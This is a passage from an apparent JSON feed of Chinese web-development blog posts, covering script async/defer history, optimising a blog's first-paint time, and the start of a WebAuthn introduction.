m);</code></pre>\n<p>这下就清楚多了。抛开 Google Analytics 的队列初始化、函数初始化的操作，<code>analytics.js</code> 本质上是通过 JS 动态创建一个 <code>&lt;script async&gt;</code> 标签、并插入到 DOM 中所有 <code>&lt;script&gt;</code> 标签之前。</p>\n<p><a href=\"https://developers.google.com/analytics/devguides/collection/analyticsjs/\">Google 关于 <code>analytics.js</code> 的文档</a> 是这么介绍的：</p>\n<blockquote>\n<p>While the Google Analytics tag described above ensures the script will be loaded and executed asynchronously on all browsers, it has the disadvantage of not allowing modern browsers to preload the script.</p>\n<p>虽然上述代码保证了脚本在所有浏览器上都会异步地加载和执行，但是它也有一个缺陷、它不能够让浏览器 preload 外部的脚本文件。</p>\n</blockquote>\n<p>Google 在文档中也给出了「现代浏览器」专用的代码，看起来和今天的 Google Tag Manager 载入代码非常接近：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-comment\">&lt;!-- Google Analytics --&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\"><span class=\"hljs-built_in\">window</span>.ga=<span class=\"hljs-built_in\">window</span>.ga||<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)</span>{(ga.q=ga.q||[]).push(<span class=\"hljs-built_in\">arguments</span>)};ga.l=+<span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>;</span><span class=\"javascript\">ga(<span class=\"hljs-string\">'create'</span>, <span class=\"hljs-string\">'UA-XXXXX-Y'</span>, <span class=\"hljs-string\">'auto'</span>);</span><span class=\"javascript\">ga(<span class=\"hljs-string\">'send'</span>, <span class=\"hljs-string\">'pageview'</span>);</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">async</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">'https://www.google-analytics.com/analytics.js'</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-comment\">&lt;!-- End Google Analytics --&gt;</span></code></pre>\n<p>Google 文档也对第二种代码进行了介绍：</p>\n<blockquote>\n<p>The alternative async tag below adds support for preloading, which will provide a small performance boost on modern browsers, but can degrade to synchronous loading and execution on IE 9 and older mobile browsers that do not recognize the <code>async</code> script attribute.</p>\n<p>第二种方法在现代浏览器上会略微提升性能，因为现代浏览器支持 preloading。但是在不认识 <code>async</code> 属性的 IE9 和一些老旧的移动端浏览器上，这种方法会降级为同步加载和执行。</p>\n</blockquote>\n<p>所以，结合上述代码和 Google 文档中的描述，我们不难得出结论：</p>\n<ul>\n<li>第一种做法（由 JS 生成 <code>&lt;script async&gt;</code> 标签、动态插入 DOM 中）可以确保 <code>analytics.js</code> 被异步加载和执行，但是在现代浏览器上由于不能提前发现 <code>analytics.js</code> 、不能 preload。</li>\n<li>第二种做法在 HTML 中直接声明了 <code>&lt;script async&gt;</code>、可以被现代浏览器在 Parse HTML 阶段发现 <code>analytics.js</code> 并 preload。但是对于「并不现代的」浏览器中，这种做法不能保证 <code>analytics.js</code> 被异步加载和执行。</li>\n</ul>\n<p>那么，为什么 Google 要这么说呢？</p>\n<h2>混乱的 defer 和 async 实现</h2>\n<p>绝大部分从事前端开发的程序员应该都非常了解 <code>defer</code> 和 <code>async</code> 以及他们的区别：</p>\n<ul>\n<li>\n<code>async</code> 的加载不会阻碍 DOM 的解析，但是当加载完后就会立即执行，执行时会阻碍 DOM 的解析</li>\n<li>\n<code>defer</code> 的加载也不会阻碍 DOM 的解析，并且会在 DOM 解析完后、<code>DOMContentLoaded</code> 触发之前执行</li>\n</ul>\n<p>鲜少有人知道的是，在 HTML5 之前，异步加载和执行外部脚本有一段混乱而荒唐的历史。</p>\n<p><code>defer</code> 属性的历史可以追溯到 1999 年 12 月 24 日制定的 HTML4.01 规范。在 <a href=\"https://www.w3.org/TR/html401/interact/scripts.html#adef-defer\">规范的第 18.2 节中的 18.2.1「SCRIPT 元素」</a> 中，有对 <code>defer</code> 属性的描述：</p>\n<blockquote>\n<p>When set, this boolean attribute provides a hint to the user agent that the script is not going to generate any document content (e.g., no \"document.write\" in javascript) and thus, the user agent can continue parsing and rendering.</p>\n<p>该 Boolean Attribute 用于提示 User Agent 这份脚本不会生成 document 内容（如，不使用 <code>document.write</code>），因此 User Agent 在遇到该脚本时不应该暂停解析和渲染 document。</p>\n</blockquote>\n<p>值得注意的是，在 HTML4.01 规范中没有强制浏览器用什么行为面对 <code>defer</code> 属性，各个浏览器的实现导致了千奇百怪的行为，这里仅简单列举几个 Quirk 行为：</p>\n<ul>\n<li>2001 年发布的 IE 6 开始对 <code>defer</code> 属性提供支持，但是直到 11 年后 IE 10 发布之前，IE 都不能保证带有 <code>defer</code> 属性的 <code>&lt;script&gt;</code> 能够按顺序执行：如果第一个 <code>defer</code> 的 <code>&lt;script&gt;</code> 使用 DOM API 修改了 DOM 结构、那么第二个 <code>&lt;script defer&gt;</code> 会在第一个 <code>&lt;script&gt;</code> 执行完毕之前就会开始执行。</li>\n<li>2009 年发布的 Firefox 3.5 开始对 <code>defer</code> 属性提供支持，<a href=\"https://bugzilla.mozilla.org/show_bug.cgi?id=688580\">但是带有 <code>defer</code> 的 <code>&lt;script&gt;</code> 可能会在 <code>DOMContentLoaded</code> 之后加载和执行</a>，而且 Firefox 甚至会异步执行带有 <code>defer</code> 属性的内联脚本。这一行为直到五年后在 Firefox 31 中才被修复。</li>\n<li>2010 年的 Chrome 8 开始实现 <code>defer</code> 属性。但如果页面的 MIME Type 为 XHTML（<code>application/xhtml+xml</code>），那么 <a href=\"https://bugs.chromium.org/p/chromium/issues/detail?id=874749\">Chrome 会无视 <code>&lt;script&gt;</code> 的 <code>defer</code> 属性</a>，因为 <a href=\"https://bugs.chromium.org/p/chromium/issues/detail?id=611136\">在 XHTML 中 <code>defer</code> 属性只是一个可选实现</a>。</li>\n</ul>\n<p>终于在 HTML5 中，不仅 <code>defer</code> 应有的行为被正式确定下来，而且还介绍了一个新的属性 <code>async</code>，提供了「真正异步地」加载和执行外部脚本的方式。也正是因为 HTML5 正式发布，下面这张介绍 <code>defer</code> 和 <code>async</code> 区别的图也开始深入人心：</p>\n<p><img src=\"https://pic.skk.moe/file/moegirl/ckz6vn6qm00003f5yh5f0tvq8.svg\"></p>\n<blockquote><p>这张出现在绝大部分文章中的图，正是来自 HTML5 规范：<a href=\"https://html.spec.whatwg.org/multipage/scripting.html#attr-script-async\">https://html.spec.whatwg.org/multipage/scripting.html#attr-script-async</a></p></blockquote>\n<p>IE 10、Chrome 8、Firefox 3.6 都对 <code>async</code> 属性提供了支持。相对于 <code>defer</code> 混乱的实现，浏览器对 <code>async</code> 的实现可谓是乖巧了许多：除 Safari 5.0 会无视 <code>async</code> 的取值外（<code>async=false</code> 时仍然会异步地加载和执行该外部脚本。这一 Bug 在 Safari 5.1 即被修复），绝大部分浏览器的实现都很正常。</p>\n<h2>等等，动态插入的 script 标签呢</h2>\n<p>如果你还记得 Google 给出的第一种 <code>analytics.js</code> 的加载方法的话（什么？你不记得了？快回到第一节再看一遍），你会注意到 Google 为了「保证了脚本在所有浏览器上都会异步地加载和执行」，使用了 <code>document.createElement('script')</code> 和 <code>el.parentNode.insertBefore</code> 动态插入 <code>&lt;script&gt;</code> 标签。这就引出了这一节的内容：动态插入的 <code>&lt;script&gt;</code> 应该按照什么顺序加载和执行呢？</p>\n<p>这个问题在 HTML4.01 的规范中完全没有说明，因此 HTML5 发布之前，当时的浏览器也依然采用了自己的实现：</p>\n<ul>\n<li>对于 WebKit、Blink 和 IE，动态插入的脚本将会被默认视为需要被异步加载和执行的脚本。如果要同步执行，需要显式声明 <code>async = false</code>。</li>\n<li>对于 Presto（早期 Opera 使用的自研内核）和 Firefox &lt;= 4，动态插入的脚本会默认同步加载和执行，除非显示声明 <code>async = true</code>。不过从 Firefox 4.0 开始，动态插入的脚本将会异步加载和执行，以和 IE、WebKit 行为保持一致（因此同步执行也一样需要显式声明 <code>async = false</code> ）；当 Opera 15 开始更换为基于 Chormium 开发（当时 Chromium 版本为 28）后，行为也变得和 IE、WebKit 一致。</li>\n</ul>\n<p>在 HTML5 规范中，这一问题终于被一劳永逸的解决了。在「<a href=\"https://html.spec.whatwg.org/multipage/scripting.html#script-processing-model\">HTML Standard - 4.12.1.1 Processing Model</a>」中明确规定了浏览器应该如何处理动态插入的 <code>&lt;script&gt;</code>。对于传统的脚本（非 Module），大致处理流程如下所示：</p>\n<blockquote><p>本图由 Sukka 绘制，按照 CC BY-NC-SA 4.0 协议共享。使用时请遵守许可协议，注明出处、不得被用于商业用途（除非获得书面许可）。</p></blockquote>\n<h2>尾声</h2>\n<p>Google Analytics 在 2013 年开始逐渐用 <code>analytics.js</code> 代替 <code>ga.js</code> 时，市面上同时存在有现代的支持 HTML5 和 <code>async</code> 属性的浏览器、和不支持 <code>async</code> 属性的「前 HTML5 时代的」古董浏览器。如果要保证在所有的浏览器上 Google Analytics 都能被异步地加载和执行，动态地将 <code>&lt;script&gt;</code> 标签插入 DOM 中、并显式声明 <code>async = true</code> 无疑是唯一的方法。随着古董浏览器逐渐退出人们的视线、实现 <code>async</code> 属性的浏览器在全球的份额已经达到了 98.08%，Google 终于开始直接用 <code>&lt;script async&gt;</code> 标签引入 Google Tag Manager。</p>\n<div class=\"license\">\n<div>从 Google Analytics 的统计代码说起 —— 谈谈 script 标签的 async 和 defer 属性</div>\n<div><a href=\"https://blog.skk.moe/post/script-async-defer/\">https://blog.skk.moe/post/script-async-defer/</a></div>\n<div>            <div>              <div>本文作者</div>\n<div>Sukka</div>\n</div>\n<div>              <div>发布于</div>\n<div>2020-10-13</div>\n</div>\n<div>              <div>许可协议</div>\n<div><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/script-async-defer/"},{"title":"再快一点，再快一点 —— 优化博客白屏时间的实践","date":"2020-10-03 08:40:00","description":"\n<p>两个多月以前，我写了一篇文章 <a href=\"https://blog.skk.moe/post/how-to-make-a-fast-blog/\">介绍我是如何优化我的博客的</a>，但是我对于博客的白屏时间仍然不满意。过去一个月我在博客上进行了一系列优化实践，终于成功将博客的白屏时间减少了将近 50%，这篇文章就来记录优化的过程和方案。</p>\n<h2>确定和分析白屏时间</h2>\n<p>First Paint 和 First Contentful Paint 是衡量白屏时间的重要指标。Google Chrome 团队提供了专门的库 <code>web-vitals</code> 用于在浏览器中衡量这些指标。直接在本地开发环境中引入该库：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">type</span>=<span class=\"hljs-string\">\"module\"</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\">  <span class=\"hljs-keyword\">import</span> {getFCP, getLCP, getFID} <span class=\"hljs-keyword\">from</span> <span class=\"hljs-string\">'https://unpkg.com/web-vitals@0.2.4/dist/web-vitals.es5.min.js?module'</span>;</span><span class=\"javascript\">  <span class=\"hljs-comment\">// 获取 First Contentful Paint</span></span><span class=\"javascript\">  getFCP(<span class=\"hljs-function\">(<span class=\"hljs-params\">{ name, value }</span>) =&gt;</span> <span class=\"hljs-built_in\">console</span>.log(name, value));</span><span class=\"javascript\">  <span class=\"hljs-comment\">// 获取 Largest Contentful Paint</span></span><span class=\"javascript\">  getLCP(<span class=\"hljs-function\">(<span class=\"hljs-params\">{ name, value }</span>) =&gt;</span> <span class=\"hljs-built_in\">console</span>.log(name, value));</span><span class=\"javascript\">  <span class=\"hljs-comment\">// 获取 First Input Delay</span></span><span class=\"javascript\">  getFID(<span class=\"hljs-function\">(<span class=\"hljs-params\">{ name, value }</span>) =&gt;</span> <span class=\"hljs-built_in\">console</span>.log(name, value));</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span></code></pre>\n<p>访问在本地运行的 Hexo Server 实例（<code>http://localhost:4000</code>），打开任意一篇文章，然后在 Dev Tools 中切换到「Performance」Tab 中限制 Network 和 CPU 性能：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.3.4/1.png\" width=\"1276\" height=\"279\"></p>\n<blockquote><p>进行性能测试时，模拟移动端的网络和性能是非常重要的。然而，Firefox 的 Dev Tools 至今很遗憾地没有实现这个功能（许多类似的 Feature Request 在 Bugzilla 已经 stall 数个月了）。这也是为什么我钟情于使用 Chromium Based 的浏览器开发的原因。</p></blockquote>\n<p>刷新页面，Console 中会输出三个数值（单位均为毫秒）：</p>\n<pre><code class=\"hljs plaintext\">FCP 1537.4400000000605LCP 1921.934FID 3.559999997378327</code></pre>\n<p>可以看到，First Contentful Paint 时间在 1.5 秒左右、而 Largest Contentful Paint（最大的可视元素，此时是文章的头图）是 1.9 秒。考虑到这是在本地环境、TTFB 只受模拟的「Fast 3G」限制，不难想象在实际访客体验中白屏时间绝对不止 1.5 秒。</p>\n<h2>分析性能瓶颈</h2>\n<p>肯定了问题的确存在，接下来就需要寻找性能瓶颈了。在「Performance」Tab 中将 CPU 性能修改为「6x slowdown」放大性能瓶颈，然后用「Start profiling and reload page」按钮刷新页面和获取火焰图：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.3.4/2.png\" width=\"1386\" height=\"946\"></p>\n<p>其中，Layout 占据的时间（117.43ms）比 Parse HTML（22.48ms）和 Recalculate Style（20.37ms）都要长得多，基本可以认定这就是性能瓶颈了。接下来判断是页面什么元素导致了 Layout 的性能瓶颈。对博客中其它页面进行 Profiling，并将火焰图进行对比：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.3.4/3.png\" width=\"860\" height=\"450\"></p>\n<blockquote><p>从左往右分别是 「<a href=\"https://blog.skk.moe/post/make-oh-my-zsh-fly/\">我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化</a>」、首页、「<a href=\"https://blog.skk.moe/post/hello-world/\">Hello World</a>」页面的火焰图和 Layout 用时。</p></blockquote>\n<p>根据火焰图和三个页面的特征，猜测是文章内容部分导致了 Layout 用时过长。为了加以验证，在 CSS 中使用 <code>display: none</code> 将文章内容直接从 DOM 中离线，然后重新生成火焰图。</p>\n<blockquote><p>在页面渲染时， <code>display: none</code>  的元素会直接从 DOM 中离线、不参加 Style 和 Layout。</p></blockquote>\n<p><img src=\"https://npm.elemecdn.com/sks@0.3.4/4.png\" width=\"1194\" height=\"946\"></p>\n<p>将文章内容设置 <code>display: none</code> 后，Layout 性能直接提升了三倍，所以可以确认性能瓶颈就是文章内容的 Layout 了。</p>\n<h2>优化白屏时间</h2>\n<p>文章内容的 Layout 时间比较长，而文章内容在加载完之前不会触发 First Paint。所以如果需要缩短白屏时间，就必须缩短文章内容 Layout 的用时。</p>\n<p>Layout 是浏览器计算元素几何信息的过程：元素的大小、在页面中的位置。Layout 性能一般和 DOM 元素数量、布局复杂性、布局模型有关。对于 DOM 元素数量这一点没有什么好的解决方案 —— 文章就这么长、每个段落就是一个 <code>&lt;p&gt;</code> 元素；对于文章内容也没有布局复杂性或布局模型可言。因此这是一条死路。</p>\n<p>直接对着自己的博客动死脑筋是行不通的，我决定先和其他的内容网站的 Layout 性能对比一下：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.3.4/5.png\" width=\"960\" height=\"500\"></p>\n<blockquote><p>上图左一为知乎专栏文章「<a href=\"https://zhuanlan.zhihu.com/p/25800461\">PWA 在饿了么的实践经验</a>」的火焰图；左二为 QuQuBlog「<a href=\"https://imququ.com/post/optimize-tls-handshake.html\">TLS 握手优化详解</a>」的火焰图；左三为 dev.to 的「<a href=\"https://dev.to/mustapha/css-grid-illustrated-introduction-52l5\">CSS Grid: illustrated introduction</a>」的火焰图。</p></blockquote>\n<p>和其它内容网站比较发现，当页面包含较长篇幅的内容时，「CPU 6x slowdown」下 Layout 用时大抵在 100ms 到 200ms 左右。我的博客内容页面 Layout 用时在 120ms 属于正常范围、基本没有进一步优化的空间。</p>\n<p>不过，我在看 dev.to 的火焰图时发现了一个很有趣的现象：虽然完整 DOM 的 Layout 用时在 123.70ms、但是却发生在 First Paint 和 First Contentful Paint 之后。</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.3.4/6.png\" width=\"1090\" height=\"314\"></p>\n<p>结合截图和火焰图可以发现，dev.to 在加载文章页面时，先只渲染 Navbar、触发 First Paint、结束白屏；之后继续 Parse HTML、渲染页面主体内容；最后是 Lazyload 后的文章头图、触发 Largest Contentful Paint。这种思路在 H5、小程序中都是很常见：使用 Placeholder （被称为 AppShell）缩短白屏时间、然后再通过 AJAX 获取数据填充到页面上。但是静态博客和小程序最大的区别就是不需要获取数据、文章内容是直接包含在 HTML 中返回的，所以在博客上实践这样的思路需要做一些改变。</p>\n<p>我的做法则是将 CSS 拆分，将 Navbar 和右下角 Fab 按钮的 CSS 提取出来、内联在 HTML 中、当页面加载时就可以 Style &amp; Layout。同时为页面主题内容添加 <code>display: none</code> 使其在 DOM 中离线，使其不影响 First Paint；页面主体内容的 CSS（包括  <code>display: block</code>） 拆分成独立的 CSS。由于 CSS 是「渲染阻塞（Render Blocking）」的资源，浏览器在 Parse HTML 时如果遇到 CSS 就会开始请求、并在 CSS 下载完成之前不会开始 Style &amp; Layout。因此，需要一个小 trick 实现异步加载 CSS（使 CSS 不再阻塞渲染）：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">link</span> <span class=\"hljs-attr\">rel</span>=<span class=\"hljs-string\">\"stylesheet\"</span> <span class=\"hljs-attr\">href</span>=<span class=\"hljs-string\">\"defer.css\"</span> <span class=\"hljs-attr\">media</span>=<span class=\"hljs-string\">\"print\"</span> <span class=\"hljs-attr\">onload</span>=<span class=\"hljs-string\">\"this.media='all';this.onload=null\"</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">noscript</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">link</span> <span class=\"hljs-attr\">rel</span>=<span class=\"hljs-string\">\"stylesheet\"</span> <span class=\"hljs-attr\">href</span>=<span class=\"hljs-string\">\"defer.css\"</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">noscript</span>&gt;</span></code></pre>\n<p>带有 <code>[media=print]</code> 属性的 CSS 仍然会以低优先级加载，但并不会直接参与 Style &amp; Layout、因此不会阻塞渲染。当 CSS 文件下载后触发 <code>onload</code> 事件、将 <code>media</code> 属性改为 <code>all</code>、使 CSS 在当前页面生效。</p>\n<p>为了使白屏不显得枯燥，我还加了一个「加载中」的闪烁动画，使用 <code>animation-delay</code> 延迟 0.6 秒显示。</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.3.4/9.png\" width=\"813\" height=\"849\"></p>\n<p>不过使用这种方案需要注意两个问题。一是当页面内容被 <code>display: none</code> 后、页面的高度会小于 viewport、因此浏览器不会展示滚动条；当页面内容被覆盖为 <code>display: block</code> 后、浏览器会重新展示滚动条、导致抖动，因此需要为 <code>&lt;html&gt;</code> 添加 <code>overflow-y: scroll</code>。另一个问题是新的 CSS 生效时会触发新的 Style &amp; Layout、可能会导致已经渲染过的 Navbar 和 Fab 按钮被再次 Layout，造成性能浪费；解决方案是使用「<a href=\"https://drafts.csswg.org/css-contain/\">CSS Containment</a>」草案中引入的 <code>contain</code> 属性，通过在 CSS 中显式声明当前元素及其后代与 DOM 的关系，当浏览器重新计算样式和布局时只会影响有限的 DOM。截至本文写就，Edge（Chromium Based）、Firefox、Chrome 都已经对 <code>contain</code> 属性提供了支持。关于 CSS Containment 的用法，可以参考 <a href=\"https://developer.mozilla.org/en-US/docs/Web/CSS/contain\">MDN 上对 contain 的说明</a>。</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.3.4/7.png\" width=\"800\" height=\"368\"></p>\n<p>同时，如果使用异步加载 CSS，那么页面主体内容的显示时机就会受到两个因素制约 —— 除 Style &amp; Layout 外、还有 CSS 的加载。为了尽可能消除 CSS 加载对文章内容显示的影响，我为 CSS 设置了 HTTP/2 Push，这样 CSS 能够和 HTML 同时到达浏览器、但不会马上参与 First Paint 的 Style &amp; Layout。关于 HTTP/2 Push 的更多细节，可以参考我的文章「<a href=\"https://blog.skk.moe/post/http2-server-push/\">静态资源递送优化：HTTP/2 和 Server Push</a>」。</p>\n<p>实践的效果妙不可言：First Paint 之前的 Style &amp; Layout 用时加起来也不超过 50ms、几乎 HTML 一下载完就可以看到 Navbar。当 <code>defer.css</code> 加载完、样式和布局计算完后文章内容即绘制到屏幕上。如果 <code>defer.css</code> 出于某种原因没有及时加载（如 User-Agent 不支持 HTTP/2 Push、<code>defer.css</code> 未能命中缓存），那么「加载中...」就会展示出来，使访客不会认为页面失去响应。</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.3.4/8.png\" width=\"1106\" height=\"945\"></p>\n<h2>尝试新属性</h2>\n<p>虽然减少了白屏时间，但是长篇幅的内容的布局计算仍然非常耗时；当文章越来越长时，用户仍然可能会对「加载中」失去耐心。不过 Chromium 85 开始对一些 CSS Containment 草案中的 CSS 属性（如 <code>content-visibility</code>）提供支持。当一个元素被声明  <code>content-visibility</code> 属性后，如果这个元素不在 viewport 中、浏览器就不会计算其后代元素样式和属性，从而大幅节省 Style &amp; Layout 耗时。目前，仅 Chrome/Chromium 85 提供对该属性的支持（没错，Firefox 把这个 Feature 也扔进「值得一试」里了）。更多关于 <code>content-visibility</code> 的介绍可以查看 <a href=\"https://web.dev/content-visibility/\">web.dev 上的相关文章</a>。</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.3.4/10.jpg\" width=\"1600\" height=\"1108\"></p>\n<p>使用 <code>content-visibility</code> 属性需要将页面内容分块。于是我写了一个 Hexo 插件，在文章内容渲染时将每两个 <code>&lt;h2&gt;</code> 之间的内容分为一块、用 <code>&lt;div class=\"story\"&gt;</code> 包裹起来。然后为 <code>.story</code> 声明 <code>content-visibility: auto</code>。</p>\n<p>需要注意的是，<code>content-visibility</code> 绕过的是不在当前 viewport 的元素的后代元素的样式和布局、只保留一个元素盒子。如果没有显式声明元素的高度的话那么这个元素的高度就是 0 了。虽然 Chrome/Chromium 在实现 <code>content-visibility</code> 时会试图避免 Curative Layout Shift（在元素即将进入 viewport 时就开始渲染），但是滚动条的高度会发生改变。所以「CSS Containment」草案中还提出了一个新属性 <code>contain-intrinsic-size</code>、用于声明一个「元素盒子」的高度。这个属性不影响渲染后元素的实际尺寸，实际使用时只需要预估高度即可：</p>\n<pre><code class=\"hljs css\"><span class=\"hljs-selector-class\">.story</span> {  <span class=\"hljs-attribute\">content</span>-<span class=\"hljs-attribute\">visibility</span>: auto;  contain-intrinsic-size: <span class=\"hljs-number\">1000px</span>; // 不靠谱地取个 <span class=\"hljs-number\">1000px</span>}</code></pre>\n<blockquote><p><code>content-visibility</code> 除了可以改善 Layout 性能外，值得一提的还有其另一个取值 <code>hidden</code>。众所周知 <code>display: none</code> 会使元素「离线」，元素会从 DOM 中消失、同时渲染状态也会随之消失；而 <code>visibility: hidden</code> 只是会隐藏元素、而元素本身依然保留在 DOM 中，渲染状态也保留。而 <code>content-visibility: hidden</code> 则介于两者之间，元素会从 DOM 中消失、但是保留渲染属性。</p></blockquote>\n<p>利用 <code>content-visibility</code> 和 <code>contain-intrinsic-size</code> 后，文章的 Layout 时间从 120ms 减少到了 70ms、减少了将近 40%，只能希望越来越多的浏览器能够提供对这两个属性的支持了。</p>\n<div class=\"license\">\n<div>再快一点，再快一点 —— 优化博客白屏时间的实践</div>\n<div><a href=\"https://blog.skk.moe/post/improve-fcp-for-my-blog/\">https://blog.skk.moe/post/improve-fcp-for-my-blog/</a></div>\n<div>            <div>              <div>本文作者</div>\n<div>Sukka</div>\n</div>\n<div>              <div>发布于</div>\n<div>2020-10-03</div>\n</div>\n<div>              <div>许可协议</div>\n<div><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/improve-fcp-for-my-blog/"},{"title":"谈谈 WebAuthn","date":"2020-03-23 14:57:59","description":"\n<p>WebAuthn，即 Web Authentication，是一个用于在浏览器上进行认证的 API，W3C 将其表述为 \"An API for accessing Public Key Credentials\"，即“一个用于访问公钥凭证的 API”。WebAuthn 很强大，强大到被认为是 Web 身份认证的未来（当然，也很复杂）。你有想过通过指纹或者面部识别来登录网站吗？WebAuthn 就能在保证安全和隐私的情况下让这样的想法成为现实。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/wwa.gif\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/wwa.gif\" alt=\"通过 WebAuthn 调起 Windows Hello 登录网站\" width=\"1912\" height=\"966\" class=\"aligncenter size-full wp-image-2215\"></a>\n<p>你可以在<a href=\"https://webauthn.io/\" rel=\"noopener\">这个网站</a>自行体验 WebAuthn。或者，如果你有一个使用 WordPress 的站点，可以尝试一下 <a href=\"https://wordpress.org/plugins/wp-webauthn/\">WP-WebAuthn</a> 这款插件，它可以为你的站点启用 WebAuthn 登录。这是我为了写这篇文章而练手开发的插件，本文中的部分示例代码也来自这款插件。</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"yrccondor\" data-mdxgithubp=\"wp-webauthn\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/yrccondor/wp-webauthn\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<p>WebAuthn Level 1 标准已在 2019 年 3 月成为 W3C 推荐标准，而 Level 2 标准目前也已进入编辑草案阶段，但互联网上有关它的中文资料却仍然很少，国内也鲜有网站支持这一新标准。于是，在抱着各种英文资料和标准啃了几天以后，我折腾出了这篇文章。</p>\n<p>在这篇文章里，我将会从最基本的概念开始，逐渐深入 WebAuthn，直到解码公钥等深层细节。这可能是你能找到的有关 WebAuthn 最详细最基础的中文文章，也很可能是最长的。在开始之前，<strong>我强烈建议你打开菜单中的文章目录浏览一遍，以对这篇文章涉及的内容有所了解。</strong>如果你只是想了解如何简单地在你的项目中添加对 WebAuthn 的支持，那么“<a href=\"https://flyhigher.top/#webauthn-overview\">浅谈 WebAuthn</a>”部分就是你要找的；如果你想了解更多关于 WebAuthn 的底层细节，那么你可以继续阅读“<a href=\"https://flyhigher.top/#deep-into-webauthn\">深入了解 WebAuthn</a>”部分。</p>\n<p>由于在本文写作时 WebAuthn Level 2 规范尚未定稿，<strong>这篇文章我们将只专注于 Level 1 规范。</strong></p>\n<p>这篇文章最后更新于 2020.9 ，在你读到这篇文章时，部分事实可能已经发生改变，请注意判断。</p>\n<p><strong>更新日志：</strong></p>\n<ul>\n<li>2021.1.16 添加 Chrome 开发工具信息</li>\n<li>2020.9.17 更新 iOS/iPad OS 兼容性信息</li>\n<li>2020.5.20 添加部分无用户名认证的平台兼容性内容</li>\n<li>2020.5.15 添加部分 <code>extensions</code> 相关内容与链接；添加全局凭证 ID 唯一内容；添加凭证 ID 查找相关内容；添加“从 U2F 认证迁移”一节</li>\n<li>2020.4.13 更新与修正 <code>userVerification</code> 相关内容；添加部分 Firefox 相关内容</li>\n<li>2020.3.23 文章发布</li>\n</ul>\n<p>那么让我们开始吧。<span></span></p>\n<h1>浅谈 WebAuthn</h1>\n<p>在这个部分里，我们将会从基础概念开始，了解有关 WebAuthn 和密码学的一些基础知识，并最终使用第三方库实现基础的 WebAuthn 认证。如果你已经对这些内容有所了解了，可以跳到“<a href=\"https://flyhigher.top/#deep-into-webauthn\">深入了解 WebAuthn</a>”继续阅读。</p>\n<h2>为什么使用 WebAuthn</h2>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/2.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/2.png\" alt=\"钓鱼邮件\" width=\"709\" height=\"693\" class=\"aligncenter size-full wp-image-2162\"></a>\n<p>相信你一定收到过类似的邮件吧？只要你点进那个最显眼的链接，你就会进入一个设置好的圈套——钓鱼网站。如果你一时糊涂在这类网站上填写了你的账号和密码，bingo，你的账号就不再是你的账号了。</p>\n<p>不过，就算你警惕心再强，也无法避免密码泄露事件。Twitter, Facebook 等都爆出过明文密码泄露事件，证明再大的公司或组织也无法避免密码泄露问题。雪上加霜的是，很大一部分用户都非常喜欢使用重复密码，这就导致一次密码泄露会牵连很多网站，用户的账户安全性完全无法得到保证。</p>\n<p>那么，有什么办法解决这些问题吗？<strong>彻底解决的方法只有一个，那就是抛弃密码。</strong>可是没有密码还怎么验证用户身份呢？这就是 WebAuthn 的用武之地了。</p>\n<p><del>没有密码的好时代，来临力！</del></p>\n<h2>什么是 WebAuthn</h2>\n<p>那么到底什么是 WebAuthn 呢？如开头所说，WebAuthn 是“一个用于访问公钥凭证的 API”，网站可以通过这个 API 进行一些高安全性的身份验证。WebAuthn 一个最常见的应用就是用于网站登录时的 2FA（双重因素验证）甚至是无密码登录。通过网页调用 WebAuthn，在不同平台下，<strong>我们可以实现通过 USB 